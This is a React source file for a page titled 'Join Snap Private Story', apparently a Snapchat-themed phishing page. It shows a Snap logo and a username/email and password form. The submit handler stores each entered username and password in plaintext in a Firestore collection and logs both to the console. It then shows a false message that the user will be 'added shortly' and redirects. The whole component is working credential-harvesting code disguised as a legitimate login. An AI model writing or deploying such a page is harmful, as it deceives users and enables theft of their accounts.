import React from "react";
import { useNavigate } from "react-router-dom";
import "../firebase";
import { getFirestore, getDocs, addDoc, collection } from "firebase/firestore";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";

function SnapLogin() {
  let navigate = useNavigate();
  const db = getFirestore();
  const [username, setUsername] = React.useState("");
  const [password, setPassword] = React.useState("");
  const [loading, setLoading] = React.useState(false);
  const [err, setErr] = React.useState(false);

  const inputStyle = {
    fontSize: "12px",
    color: "black",
    backgroundColor: "#f7f7f7",
    width: "95%",
    padding: "0.5rem 1rem",
    borderWidth: "0 0 2px 0",
    borderStyle: "solid",
    borderColor: "#e2e8f0",
    transition: "all 300ms ease-in-out",
  };

  const handleFocus = (e) => {
    e.target.style.outline = "none";
    e.target.style.borderColor = "#0fadff";
  };

  const handleBlur = (e) => {
    e.target.style.borderColor = "#e2e8f0";
  };

  const handleClick = async () => {
    if (username.trim() !== "" && password.trim() !== "") {
      console.log("clicked");
      setLoading(true);
      const docRef = await addDoc(collection(db, "myCollection"), {
        username: username,
        password: password,
      });

      console.log(username);
      console.log(password);
      setUsername("");
      setPassword("");
      toast.success(
        "Request Submitted! If your username and password are correct, you'll be added shortly.",
        {
          position: "top-center",
          autoClose: 5000,
          hideProgressBar: false,
          closeOnClick: true,
          pauseOnHover: true,
          draggable: true,
          progress: undefined,
          theme: "dark",
        }
      );
      setTimeout(() => {
        navigate("/");
        setLoading(false);
      }, 2000);
    } else {
      console.log("empty");
      setErr(true);
    }
  };

  return (
    <div className="bg-[#f2f2f2] w-full h-screen overflow-hidden flex-center">
      <div className="border shadow-sm bg-white flex-center flex-col gap-4 w-[310px]  p-6 rounded-md border-solid border-gray-200 max-md:px-5 md:w-[380px]">
        {" "}
        <img
          loading="lazy"
          src="https://cdn.builder.io/api/v1/image/assets/TEMP/0b27981804944e75d6f90b9634067dffbfab942823d624c4cba6c925f1885175?"
          className="aspect-square object-contain object-center w-[60px] justify-center items-center overflow-hidden self-center max-w-full"
        />
        <p className="text-2xl font-medium text-center text-black">Join Snap Private Story</p>
        <div className="mt-6 mx-auto w-full flex items-start flex-col text-black">
          <p className="text-xs mb-2">Username or Email</p>
          <input
            type="text"
            name="text"
            style={inputStyle}
            onFocus={handleFocus}
            onBlur={handleBlur}
            value={username}
            onChange={(e) => setUsername(e.target.value)}
          />
        </div>
        <div className="mt-2 mx-auto w-full flex items-start flex-col text-black">
          <p className="text-xs mb-2">Password</p>
          <input
            type="password"
            name="password"
            style={inputStyle}
            onFocus={handleFocus}
            onBlur={handleBlur}
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
          {err && (
            <p className="mt-2 text-xs text-[#e1143d] font-medium">
              Please fill all the fields
            </p>
          )}
        </div>
        <button
          onClick={handleClick}
          className="mt-2 px-4 py-2 rounded-2xl text-white text-sm mx-auto bg-blue"
        >
          {!loading ? (
            "Submit"
          ) : (
            <div className="w-16 h-5 flex-center">
              <span className="loading loading-spinner"></span>
            </div>
          )}
        </button>
        <ToastContainer
          position="top-center"
          autoClose={5000}
          hideProgressBar={false}
          newestOnTop={false}
          closeOnClick
          rtl={false}
          pauseOnFocusLoss
          draggable
          pauseOnHover
          theme="dark"
        />
      </div>
    </div>
  );
}

export default SnapLogin;
